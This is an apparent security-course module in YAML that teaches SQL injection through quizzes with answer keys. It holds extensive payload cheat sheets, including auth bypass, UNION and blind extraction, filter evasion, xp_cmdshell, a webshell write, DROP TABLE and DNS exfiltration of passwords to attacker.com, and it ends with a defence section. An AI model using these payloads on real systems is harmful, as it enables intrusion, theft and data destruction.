id: 2
title: "SQL Injection Mastery"
slug: "sql-injection-mastery"
difficulty: "easy"
description: "Master SQL injection — from basic auth bypass to advanced payloads, blind injection, filter evasion, and database-specific techniques."
order: 2

challenges:
  - id: sqli-qa-1
    type: qa
    title: "SQL Injection Fundamentals"
    points: 10
    content: |
      SQL (Structured Query Language) is used to communicate with databases.
      Websites use SQL to store and retrieve data like usernames, passwords, and articles.

      A typical login query looks like this:
        SELECT * FROM users WHERE username = 'john' AND password = 'secret123';

      SQL Injection (SQLi) is a vulnerability that occurs when user input is
      directly inserted into a SQL query without proper sanitization. An attacker
      can inject SQL commands to manipulate the query's behavior.

      ============= BASIC AUTH BYPASS =============
      The most basic SQLi test uses a single quote (') to break out of the string.
      If the application returns an error, it might be vulnerable.

      Login Bypass Payloads:
        Username: admin' --      Password: anything
        Username: admin' /*      Password: anything
        Username: ' OR 1=1 --    Password: anything
        Username: ' OR '1'='1    Password: ' OR '1'='1
        Username: admin'-- -     Password: (empty)        [MSSQL variant]
        Username: admin' #       Password: anything       [MySQL variant]

      What happens with ' OR 1=1 --:
        Query becomes:
          SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'anything'
        1=1 is always TRUE, so the query returns ALL users.
        The application often logs you in as the first user (usually admin).

      Common SQL comment symbols:
        -- (double dash):  SQL comment (ANSI standard, most databases)
        -- - (dash dash space dash):  MSSQL comment variant
        # (hash):          MySQL comment
        /* */ (slash-star): Multi-line comment (works in most databases)

      ============= DETECTION PAYLOADS =============
      Test if a parameter is vulnerable to SQLi:

      String-based (WHERE clause):
        '   -> causes error (database breaks)
        ''  -> valid (two quotes = escaped quote)
        ' OR 1=1 --  -> returns all rows
        ' OR 1=2 --  -> returns no rows (test TRUE/FALSE behavior)

      Numeric-based (ID parameter):
        1   -> normal
        1'  -> error
        1 AND 1=1 -> works normally
        1 AND 1=2 -> works differently (FALSE condition)

      The difference between 1=1 and 1=2 responses confirms SQL injection.

      ============= BASIC PAYLOAD CHEAT SHEET =============
      Auth Bypass:
        admin' --
        admin' #
        admin'/*
        ' OR 1=1--
        ' OR 1=1#
        ' OR 1=1/*
        ') OR 1=1--
        ') OR '1'='1'--
        " OR 1=1--
        or 1=1--
        or 1=1#
        or 1=1/*
    questions:
      - q: "What does SQL stand for?"
        a: "Structured Query Language"
      - q: "What symbol breaks out of a string in a SQL query for injection testing?"
        a: "'"
      - q: "What does -- do in a SQL query?"
        a: "Comments out the rest of the query"
      - q: "What payload returns all rows from a table by creating an always-true condition?"
        a: "' OR 1=1 --"
      - q: "In MySQL, what symbol is used as a comment instead of --?"
        a: "#"

  - id: sqli-qa-2
    type: qa
    title: "UNION-Based SQL Injection & Data Extraction"
    points: 10
    content: |
      The UNION operator in SQL combines results from two or more SELECT queries.
      Attackers use UNION to extract data from other tables in the database.

      ============= UNION SYNTAX =============
        SELECT column1, column2 FROM table1
        UNION
        SELECT column1, column2 FROM table2

      Rules for UNION:
        - Both SELECTs must return the SAME NUMBER of columns
        - Corresponding columns should have compatible data types
        - UNION removes duplicates; UNION ALL keeps duplicates

      ============= FINDING COLUMN COUNT =============
      Method 1: ORDER BY (increment until error)
        ' ORDER BY 1 --   (works - page loads)
        ' ORDER BY 2 --   (works)
        ' ORDER BY 3 --   (works)
        ' ORDER BY 4 --   (ERROR - page breaks -> only 3 columns)

      Method 2: UNION SELECT NULL (increment until no error)
        ' UNION SELECT NULL --         (error -> wrong column count)
        ' UNION SELECT NULL,NULL --    (error)
        ' UNION SELECT NULL,NULL,NULL -- (works! 3 columns)

      Using NULL is better than using numbers because NULL is compatible
      with any data type.

      ============= DATA EXTRACTION =============
      Once column count is known (e.g., 3 columns), extract data:
        ' UNION SELECT 1,2,3 --
        (One of the numbers will appear on the page — that's your output column)

      Then replace that column position with data you want:
        ' UNION SELECT 1,database(),3 --
        (Shows the current database name)

        ' UNION SELECT 1,@@version,3 --
        (MySQL: shows database version)

        ' UNION SELECT 1,version(),3 --
        (PostgreSQL: shows database version)

      ============= MYSQL INFORMATION_SCHEMA =============
      All databases store metadata in information_schema.

      List all databases:
        ' UNION SELECT 1,schema_name,3 FROM information_schema.schemata --

      List all tables in a database:
        ' UNION SELECT 1,table_name,3 FROM information_schema.tables
          WHERE table_schema='database_name' --

      List all columns in a table:
        ' UNION SELECT 1,column_name,3 FROM information_schema.columns
          WHERE table_name='users' --

      Extract credentials:
        ' UNION SELECT 1,username,password FROM users --

      ============= MYSQL PAYLOAD CHEAT SHEET =============
      Database version:       SELECT @@version
      Current user:           SELECT user()
      Current database:       SELECT database()
      List databases:         SELECT schema_name FROM information_schema.schemata
      List tables:            SELECT table_name FROM information_schema.tables
                                WHERE table_schema='db_name'
      List columns:           SELECT column_name FROM information_schema.columns
                                WHERE table_name='users'
      Read files:             SELECT LOAD_FILE('/etc/passwd')
      Write files:            SELECT 'shell' INTO OUTFILE '/var/www/shell.php'

      ============= POSTGRESQL PAYLOADS =============
      Version:                SELECT version()
      Current user:           SELECT current_user
      Current database:       SELECT current_database()
      List tables:            SELECT table_name FROM information_schema.tables
                                WHERE table_schema='public'
      List columns:           SELECT column_name FROM information_schema.columns
                                WHERE table_name='users'

      ============= MSSQL PAYLOADS =============
      Version:                SELECT @@version
      Current user:           SELECT SYSTEM_USER
      List tables:            SELECT name FROM sysobjects WHERE xtype='U'
      List columns:           SELECT name FROM syscolumns WHERE id=
                                (SELECT id FROM sysobjects WHERE name='users')
      Stacked queries:        '; EXEC xp_cmdshell 'whoami' --

      ============= SQLITE PAYLOADS =============
      Version:                SELECT sqlite_version()
      List tables:            SELECT name FROM sqlite_master WHERE type='table'
      Create table SQL:       SELECT sql FROM sqlite_master WHERE name='users'
    questions:
      - q: "What SQL keyword combines results from multiple SELECT queries?"
        a: "UNION"
      - q: "What technique is used to find how many columns a query returns?"
        a: "ORDER BY"
      - q: "In MySQL, what function shows the current database name?"
        a: "database()"
      - q: "What schema contains metadata about all tables and columns in MySQL?"
        a: "information_schema"
      - q: "In MySQL, what function reads files from the filesystem?"
        a: "LOAD_FILE()"
      - q: "What is the ORDER BY column enumeration technique? (Provide an example)"
        a: "Incrementing ORDER BY until error: ' ORDER BY 1 --, ' ORDER BY 2 --"

  - id: sqli-qa-3
    type: qa
    title: "Error-Based SQL Injection"
    points: 10
    content: |
      Error-based SQL injection uses database error messages to extract
      information. Instead of relying on UNION output, the attacker forces
      the database to include data in the error message itself.

      ============= HOW IT WORKS =============
      Some databases return verbose error messages that include parts of
      the malformed query. Attackers craft queries that cause intentional
      errors containing the data they want to extract.

      ============= MYSQL EXTRACTVALUE() =============
        ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --

      How it works:
        EXTRACTVALUE() expects valid XPath as second argument.
        We pass CONCAT(0x7e, data) which creates invalid XPath.
        MySQL returns an error like:
          "XPATH syntax error: '~database_name'"

        The 0x7e (~) is a tilde character that makes the XPath invalid,
        causing the error message to display our data.

        Extract tables:
        ' AND EXTRACTVALUE(1, CONCAT(0x7e,
            (SELECT GROUP_CONCAT(table_name)
             FROM information_schema.tables
             WHERE table_schema=database()))) --

      ============= MYSQL UPDATEXML() =============
        ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1) --

      Similar to EXTRACTVALUE(), but limited to 32 characters of output.
      Use SUBSTRING() to read in chunks:
        ' AND UPDATEXML(1, CONCAT(0x7e,
            (SELECT SUBSTRING(password,1,32) FROM users LIMIT 1)), 1) --

      ============= MYSQL DOUBLE QUERY (OLD TECHNIQUE) =============
        ' OR (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(
             (SELECT table_name FROM information_schema.tables LIMIT 1), FLOOR(RAND()*2))) --

      This creates a duplicate key error that leaks the table name.
      Older technique, less reliable on modern MySQL.

      ============= POSTGRESQL ERROR-BASED =============
        ' AND 1=CAST((SELECT current_database()) AS INTEGER) --

      PostgreSQL tries to cast a string (database name) to INTEGER.
      Cast fails and error message shows the value:
        "invalid input syntax for type integer: 'database_name'"

      ============= MSSQL ERROR-BASED =============
        ' AND 1=CONVERT(INT, (SELECT @@version)) --

      CONVERT tries to cast the version string to INT, fails,
      and error message displays the version string.

      ============= LIMITATIONS =============
      - Output is usually truncated (32-64 chars per error)
      - Use SUBSTRING()/SUBSTR() to extract long data in chunks
      - Error-based only works if the application shows database errors
      - Modern apps often suppress detailed error messages
    questions:
      - q: "What MySQL function can be tricked into leaking data via XPath error messages?"
        a: "EXTRACTVALUE()"
      - q: "What character (in hex 0x7e) is prepended to data to create invalid XPath?"
        a: "~ (tilde)"
      - q: "What PostgreSQL technique casts data to an incompatible type to leak it in errors?"
        a: "CAST(... AS INTEGER)"
      - q: "What limits error-based output in MySQL EXTRACTVALUE()?"
        a: "32 characters"
      - q: "How do you read long data in chunks with error-based SQLi?"
        a: "Using SUBSTRING() or SUBSTR()"

  - id: sqli-qa-4
    type: qa
    title: "Blind SQL Injection — Boolean-Based"
    points: 10
    content: |
      Blind SQL Injection is used when you cannot see data output directly
      (no UNION results, no error messages). Instead, you ask TRUE/FALSE
      questions and observe differences in the page response.

      ============= BOOLEAN-BASED BLIND SQLI =============
      If the page behaves differently when a condition is TRUE vs FALSE,
      you can infer information one bit at a time.

      Example — a vulnerable URL:
        http://site.com/product?id=1

      Test TRUE condition:
        http://site.com/product?id=1 AND 1=1
        (Page loads normally — TRUE)

      Test FALSE condition:
        http://site.com/product?id=1 AND 1=2
        (Page is different — maybe empty, maybe error — FALSE)

      The difference confirms boolean-based blind SQLi.

      ============= EXTRACTING DATA =============
      Checking the database name length:
        1 AND LENGTH(database())=1 --  (FALSE if not length 1)
        1 AND LENGTH(database())=2 --  (FALSE)
        ... continue until TRUE ...

      Extracting characters one by one:
        1 AND SUBSTRING(database(),1,1)='a' --
        1 AND SUBSTRING(database(),1,1)='b' --
        ... repeat until TRUE (with binary search it takes log2(26) = 5 tries per char)

      Checking table existence:
        1 AND (SELECT COUNT(*) FROM information_schema.tables
               WHERE table_schema=database()) > 0 --

      Extracting table name character by character:
        1 AND SUBSTRING(
          (SELECT table_name FROM information_schema.tables
           WHERE table_schema=database() LIMIT 1), 1, 1) = 'a' --

      ============= SUBSTRING SYNTAX BY DATABASE =============
      MySQL:        SUBSTRING(string, position, length)
                   SUBSTR(string, position, length)
                   MID(string, position, length)
      PostgreSQL:   SUBSTRING(string FROM position FOR length)
      MSSQL:        SUBSTRING(string, position, length)
      Oracle:       SUBSTR(string, position, length)
      SQLite:       SUBSTR(string, position, length)

      ============= BINARY SEARCH FOR EFFICIENCY =============
      Instead of checking all 26 letters, use comparisons:
        1 AND SUBSTRING(database(),1,1) > 'm' --  (is first char > 'm'?)
        1 AND SUBSTRING(database(),1,1) = 's' --  (is first char 's'?)

      With binary search, each character needs ~5 requests instead of 26.
      Tools like sqlmap automate this entire process.

      ============= ASCII-BASED EXTRACTION =============
      More reliable: compare ASCII values instead of characters:
        1 AND ASCII(SUBSTRING(database(),1,1)) > 100 --
        1 AND ASCII(SUBSTRING(database(),1,1)) = 115 --  (115 = 's')

      ============= DETECTION PAYLOADS =============
      These work for both boolean and time-based blind:

        ' AND '1'='1           (TRUE)
        ' AND '1'='2           (FALSE)
        AND 1=1                (TRUE)
        AND 1=2                (FALSE)
        OR 1=1 --              (TRUE)
        OR 1=2 --              (FALSE)
        ' AND SLEEP(5) AND '1'='1  (MySQL time-based)
        ' WAITFOR DELAY '0:0:5' -- (MSSQL time-based)
    questions:
      - q: "What is blind SQL injection used for when you can't see query output?"
        a: "Extracting data through TRUE/FALSE questions"
      - q: "What technique checks character by character using comparisons?"
        a: "Boolean-based blind SQLi"
      - q: "What function extracts part of a string in MySQL?"
        a: "SUBSTRING()"
      - q: "What ASCII function is used for character-by-character extraction?"
        a: "ASCII()"
      - q: "How many requests per character can binary search save vs linear search?"
        a: "Binary search: ~5 requests vs linear: ~26 requests"

  - id: sqli-qa-5
    type: qa
    title: "Blind SQL Injection — Time-Based"
    points: 10
    content: |
      Time-based SQL injection is used when the page returns the same
      response for both TRUE and FALSE conditions. The attacker uses
      database delay functions to infer data based on response time.

      ============= HOW IT WORKS =============
      The attacker makes a condition that causes a delay (SLEEP) if TRUE
      and no delay if FALSE. By measuring response time, you know if the
      condition is TRUE or FALSE.

      ============= TIME-BASED PAYLOADS BY DATABASE =============

      MySQL:
        1 AND SLEEP(5) --           (delays 5 seconds)
        1 AND BENCHMARK(10000000, MD5('test')) --  (alternative to SLEEP)
        1 AND IF(1=1, SLEEP(5), 0) --   (conditional delay)
        1 OR IF(1=1, SLEEP(5), 0) --     (conditional delay with OR)

      PostgreSQL:
        1 AND pg_sleep(5) --        (delays 5 seconds)
        1 AND (SELECT pg_sleep(5)) --

      MSSQL:
        1 WAITFOR DELAY '0:0:5' --  (delays 5 seconds)
        1; WAITFOR DELAY '0:0:5' -- (stacked query variant)

      Oracle:
        1 AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5) --   (Oracle delay)
        1 AND DBMS_LOCK.SLEEP(5) --   (requires privilege)

      SQLite:
        1 AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000/2)))) --
        (Causes delay by computing large random blob)

      ============= EXTRACTING DATA WITH TIME-BASED =============
      Check database name length:
        1 AND IF(LENGTH(database())=4, SLEEP(3), 0) --
        (If delay is 3 seconds, database name is 4 characters)

      Extract first character:
        1 AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0) --
        (If 3 second delay, first char ASCII is 115 = 's')

      Extract table names:
        1 AND IF(ASCII(SUBSTRING(
          (SELECT table_name FROM information_schema.tables
           WHERE table_schema=database() LIMIT 1), 1, 1)) > 100,
          SLEEP(3), 0) --

      ============= BENCHMARK() FUNCTION (MySQL) =============
      BENCHMARK(count, expression) repeats an expression count times.
        benchmark(10000000, md5('test'))

      This is CPU-intensive. The higher the count, the longer the delay.
      Approximate delays:
        BENCHMARK(1000000, MD5('a'))  -> ~0.5 seconds
        BENCHMARK(10000000, MD5('a')) -> ~5 seconds
        BENCHMARK(50000000, MD5('a')) -> ~25 seconds

      ============= OUT-OF-BAND (OOB) TECHNIQUES =============
      When time-based is blocked, use external services:

      MySQL OOB (requires LOAD_FILE or INTO OUTFILE privileges):
        1 AND LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\test')) --

      MSSQL OOB:
        1; EXEC master..xp_dirtree '\\attacker.com\'+(SELECT user) --

      ============= CAUTION =============
      - Time-based injection is SLOW (5 seconds per character)
      - Use binary search to minimize delays
      - Automated tools (sqlmap) handle this efficiently
      - Avoid long delays in production testing (can trigger DDoS protection)
    questions:
      - q: "What MySQL function causes a time delay?"
        a: "SLEEP()"
      - q: "What is the PostgreSQL equivalent of SLEEP()?"
        a: "pg_sleep()"
      - q: "What is the MSSQL syntax for time delay?"
        a: "WAITFOR DELAY '0:0:5'"
      - q: "What MySQL function can cause CPU-intensive delays as an alternative to SLEEP()?"
        a: "BENCHMARK()"
      - q: "What Oracle function is used for time delays?"
        a: "DBMS_PIPE.RECEIVE_MESSAGE()"

  - id: sqli-qa-6
    type: qa
    title: "SQL Injection Filter Bypass Techniques"
    points: 10
    content: |
      Developers try to block SQL injection by filtering dangerous keywords.
      Attackers have many ways to bypass these filters.

      ============= COMMENT BYPASSES =============
      Filter blocking spaces?
        'OR'1'='1'--  (no spaces - works in MySQL)
        'OR/**/1=1/**/--  (inline comments replace spaces)

      Filter blocking OR and AND?
        ' || 1=1 --     (|| is OR in SQL concatenation... but also OR in some DBs)
        ' | 1=1 --      (bitwise OR)
        ' & 1=1 --      (bitwise AND)
        ' && 1=1 --     (AND alternative in MySQL)
        ' XOR 1=1 --    (XOR alternative)

      ============= QUOTE BYPASSES =============
      Filter blocking single quotes?
        Use hex encoding (MySQL):
          ' UNION SELECT 1,2,3 FROM users WHERE username=0x61646D696E --
          (0x61646D696E = 'admin' in hex)

        Use CHAR() function:
          ' UNION SELECT 1,2,3 FROM users WHERE username=CHAR(97,100,109,105,110) --
          (CHAR(97,100,109,105,110) = 'admin' in ASCII codes)

      ============= KEYWORD BYPASSES =============
      Filter blocking UNION?
        Case variation:    UnIoN, uNiOn
        Nested comments:   UN/**/ION
        Alternative:       Use OR/AND with blind injection instead

      Filter blocking SELECT?
        Case variation:    SeLeCt
        Nested comments:   SEL/**/ECT
        Hex encoding:      SELECT = 0x53454C454354 (but can't use in UNION context)

      Filter blocking = (equals)?
        Use LIKE:          ' OR 1 LIKE 1 --
        Use IN:            ' OR 1 IN (1) --
        Use BETWEEN:       ' OR 1 BETWEEN 0 AND 2 --
        Use <> (not equals as comparison):  ' OR 'a' <> 'b' --

      ============= SPACE BYPASSES =============
      Spaces filtered?
        Tabs:       %09 (horizontal tab)
        Newlines:   %0A (line feed)
        Comments:   /**/
        Backticks:  `  (MySQL backticks can sometimes replace spaces)

      Example without spaces:
        'UNION(SELECT(1),(2),(3))--   (parentheses replace spaces)
        'UNION(SELECT(database()),user(),@@version)--   (works in MySQL)

      ============= DOUBLE ENCODING =============
      If the app decodes input twice, encode twice:
        Single quote:   '  -> %27 -> %2527
        SELECT:         SELECT -> %53454c454354 -> %25534c454354

      ============= HTTP HEADER INJECTION =============
      Sometimes the vulnerability is in HTTP headers:
        User-Agent: ' OR 1=1 --
        X-Forwarded-For: ' OR 1=1 --
        Cookie: ' OR 1=1 --

      ============= WAF BYPASS TECHNIQUES =============
      1. Buffer overflow: send very long input to crash WAF regex
      2. Parameter pollution: id=1&id=2&id=3 (some WAFs only check first)
      3. HTTP parameter pollution: ?id=1&id=2 (different servers interpret differently)
      4. Null byte injection: %00 before payload
      5. Unicode normalization: using full-width characters
    questions:
      - q: "How can you bypass a filter that blocks spaces in MySQL?"
        a: "Using /**/ comments or parentheses"
      - q: "What hex prefix represents a string in MySQL without quotes?"
        a: "0x"
      - q: "What MySQL function converts ASCII codes to a string without quotes?"
        a: "CHAR()"
      - q: "How do you bypass a keyword filter blocking UNION?"
        a: "Case variation (UnIoN) or comments (UN/**/ION)"
      - q: "What is parameter pollution in WAF bypass context?"
        a: "Sending multiple parameters with same name to confuse WAF"

  - id: sqli-qa-7
    type: qa
    title: "Advanced SQLi — Second-Order, Stacked, & Out-of-Band"
    points: 10
    content: |
      Beyond basic SQL injection, there are advanced techniques that
      experienced attackers use in complex scenarios.

      ============= SECOND-ORDER SQL INJECTION =============
      Also called "stored SQL injection". The payload is stored in the
      database first (e.g., during registration), then executed later
      when that data is used in a different query.

      Example:
        1. Attacker registers with username:  '; UPDATE users SET admin=1 WHERE username='admin' --
        2. The registration inserts this into a user profile table
        3. Later, an admin views profile, and the stored username
           is inserted into a query -> payload executes

      Why it works:
        - Input validation at entry point might be safe
        - But the STORED data is used unsafely in a different query later
        - Very hard to detect with scanners (scanners only test entry points)

      Detection:
        - Manual code review
        - Submit safe-looking data, then trace how it's used later

      ============= STACKED QUERIES =============
      Some databases support executing multiple queries separated by ;

      MySQL (with PHP mysqli_multi_query, Python, or Java - NOT with mysql_query):
        '; DROP TABLE users; --           (deletes users table)
        '; INSERT INTO logs VALUES('hacked'); --
        '; UPDATE users SET password='newpass' WHERE id=1; --

      MSSQL (most flexible for stacked queries):
        '; EXEC xp_cmdshell 'whoami' --
        '; EXEC sp_addlogin 'hacker', 'pass123' --
        '; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services' --

      PostgreSQL:
        '; CREATE TABLE hacked(data text); --
        '; COPY hacked FROM '/etc/passwd'; --

      Oracle:
        Oracle does NOT support stacked queries in most contexts.
        Use UNION or other techniques.

      SQLite:
        '; CREATE TABLE stolen(data text); --

      Note: Stacked queries depend on the database API used.
      PHP's mysql_query() only allows single queries.
      PHP's mysqli_multi_query() allows stacked but is less common.
      Python and Java connectors generally allow stacked queries.

      ============= OUT-OF-BAND SQLI (OOB) =============
      When data can't be extracted via HTTP response (blind, no error messages),
      send data to an external server.

      MySQL OOB (Windows - UNC path):
        ' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\',
          (SELECT @@version), '.attacker.com\\test')) --

      MSSQL OOB (UNC path via xp_dirtree):
        '; EXEC master..xp_dirtree '\\attacker.com\'+(SELECT @@version) --

      Oracle OOB (UTL_HTTP):
        '; EXEC UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) --

      For OOB, you need:
        - A server you control to receive the DNS/HTTP request
        - Database network access to reach your server
        - Tools: Burp Collaborator, Interactsh, or your own VPS

      ============= DNS EXFILTRATION =============
      Even more stealthy: use DNS queries to exfiltrate data:
        '; EXEC master..xp_dirtree
          '\\'+(SELECT password FROM users WHERE id=1)+'.attacker.com\test' --

      On your DNS server, you'll see queries like:
        plaintext12345.attacker.com
      The subdomain contains the exfiltrated data.
    questions:
      - q: "What is second-order SQL injection?"
        a: "Payload stored in DB first, executed later in a different query"
      - q: "What database function in MSSQL executes system commands?"
        a: "xp_cmdshell"
      - q: "What MSSQL procedure lists directory contents over SMB (useful for OOB)?"
        a: "xp_dirtree"
      - q: "What Oracle procedure can send HTTP requests to exfiltrate data?"
        a: "UTL_HTTP"
      - q: "Why is stacked query support dependent on the API? (e.g., PHP mysql_query)"
        a: "Some APIs only allow single statement execution"

  - id: sqli-qa-8
    type: qa
    title: "SQL Injection Prevention & Defense"
    points: 10
    content: |
      Understanding prevention is essential for both defenders and
      ethical attackers. Here are the definitive defense techniques.

      ============= PARAMETERIZED QUERIES (PREPARED STATEMENTS) =============
      The #1 defense. Separates SQL code from data completely.
      User input is NEVER concatenated into the query string.

      Python (sqlite3):
        cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?",
                       (username, password))

      Python (MySQL/PostgreSQL with psycopg2):
        cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s",
                       (username, password))

      Python (with ORM like SQLAlchemy):
        User.query.filter_by(username=username, password=password).first()

      PHP (PDO):
        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
        $stmt->execute(['user' => $username, 'pass' => $password]);

      Java (JDBC):
        PreparedStatement stmt = conn.prepareStatement(
          "SELECT * FROM users WHERE username = ? AND password = ?");
        stmt.setString(1, username);
        stmt.setString(2, password);

      Node.js (mysql2):
        connection.execute(
          "SELECT * FROM users WHERE username = ? AND password = ?",
          [username, password]
        );

      ============= STORED PROCEDURES =============
      Similar to parameterized queries but stored in the database:
        CREATE PROCEDURE LoginUser(@username NVARCHAR(50), @password NVARCHAR(50))
        AS
        BEGIN
          SELECT * FROM users WHERE username = @username AND password = @password
        END

      Note: Stored procedures can STILL be vulnerable if they concatenate
      input internally (dynamic SQL inside the procedure).

      ============= INPUT VALIDATION (SECONDARY DEFENSE) =============
      Never rely on input validation alone, but use it as defense-in-depth:

      Whitelist validation (BEST):
        - If input should be an integer, check it's actually digits
        - If input should be alphanumeric, reject special characters
        - Use regex: ^[a-zA-Z0-9]+$

      Blacklist validation (WORST - easily bypassed):
        - Filtering ' OR 1=1 --  but missing Unicode variants
        - Filtering UNION but missing UN/**/ION
        - Blacklists are almost always incomplete

      ============= ESCAPING (LEAST PREFERRED) =============
      If parameterized queries aren't possible (legacy code):
        MySQL:  mysql_real_escape_string() (not addslashes()!)
        PostgreSQL: pg_escape_string()
        MSSQL:  Use QUOTENAME() for identifiers

      Never use addslashes() — it doesn't handle all charset attacks.

      ============= LEAST PRIVILEGE PRINCIPLE =============
      Database accounts should have minimum permissions:
        - Web app account: only SELECT + INSERT on needed tables
        - No DROP, CREATE, ALTER permissions
        - No FILE privilege (prevents LOAD_FILE/INTO OUTFILE)
        - No access to xp_cmdshell (MSSQL)
        - Separate read-only account for queries that don't need write

      ============= WAF (WEB APPLICATION FIREWALL) =============
      WAFs can detect and block SQLi attempts, but:
        - Can be bypassed (as shown in filter bypass section)
        - Should be defense-in-depth, not sole protection
        - Popular: ModSecurity, Cloudflare WAF, AWS WAF

      ============= REGULAR TESTING =============
      - Run automated scanners (sqlmap, Burp Scanner)
      - Manual penetration testing
      - Code review focusing on database queries
      - Use SQLi detection in CI/CD pipeline

      ============= COMPLETE PREVENTION CHECKLIST =============
      [ ] Use parameterized queries for ALL database operations
      [ ] Apply least privilege to database accounts
      [ ] Validate input (whitelist approach)
      [ ] Disable error messages in production
      [ ] Use WAF as additional defense layer
      [ ] Regular security testing (automated + manual)
      [ ] Keep database and libraries up to date
      [ ] Log and monitor database errors for attacks
    questions:
      - q: "What is the #1 defense against SQL injection?"
        a: "Parameterized queries / prepared statements"
      - q: "In Python sqlite3, what placeholder is used in parameterized queries?"
        a: "?"
      - q: "What is the least preferred defense method that involves escaping input?"
        a: "Escaping (e.g., mysql_real_escape_string)"
      - q: "Why should a web app database account not have FILE privilege?"
        a: "Prevents LOAD_FILE and INTO OUTFILE attacks"
      - q: "What approach is better: whitelist or blacklist input validation?"
        a: "Whitelist validation"

